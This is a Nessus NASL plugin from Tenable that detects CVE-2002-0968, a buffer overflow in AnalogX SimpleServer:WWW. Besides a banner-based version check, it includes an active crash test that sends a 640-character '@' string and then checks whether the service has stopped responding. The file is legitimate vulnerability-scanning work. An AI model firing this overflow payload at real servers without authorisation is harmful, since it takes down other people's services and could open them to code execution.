#
# (C) Tenable Network Security, Inc.
#

# Rerefence:
# To: bugtraq@securityfocus.com
# From:"Fort _" <fort@linuxmail.org>
# Subject: Remote DoS in AnalogX SimpleServer:www 1.16
# Message-ID: <20020613122121.31625.qmail@mail.securityfocus.com>

include("compat.inc");

if(description)
{
 script_id(11035);
 script_version("$Revision: 1.17 $");

 script_cve_id("CVE-2002-0968");
 script_bugtraq_id(5006);
 script_xref(name:"OSVDB", value:"3780");

 script_name(english:"AnalogX SimpleServer:WWW Buffer Overflow");
 script_summary(english:"Crashes SimpleServer:WWW");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote web server is vulnerable to a buffer overflow attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The remote installation of AnalogX SimpleServer:WWW is affected by a\n",
   "buffer overflow triggered when processing input, such as a series of\n",
   "640 '@' characters.  An unauthenticated remote attacker can leverage\n",
   "this issue to crash the affected service or even to execute arbitrary\n",
   "code on the remote host."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2002-06/0106.html"
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2002-07/0012.html"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Upgrade to version 1.23 or later as that reportedly fixes the issue."
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/simpleserver");
 exit(0);
}

# The script code starts here

include("http_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);

banner = get_http_banner(port: port);
if (! banner) exit(0);

if (!egrep(pattern:"^Server: *SimpleServer:WWW/", string:banner)) exit(0);


if (safe_checks())
{
  if (egrep(pattern:"^Server: *SimpleServer:WWW/1.[01]([^0-9]|$)", string:banner))
  {
    server = strstr(banner, "Server:");
    server = server - strstr(server, '\r\n');

    report = string(
      "\n",
      "Nessus made this determination based on the version in the following\n",
      "Server response header :\n",
      "\n",
      "  ", server, "\n"
    );
    security_hole(port:port, extra:report);
  }
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc) exit(0);

send(socket:soc, data:string(crap(length:640, data:"@"), "\r\n\r\n"));
r = http_recv(socket:soc);
close(soc);

soc = open_sock_tcp(port);
if(soc) { close(soc); exit(0); }

security_hole(port);
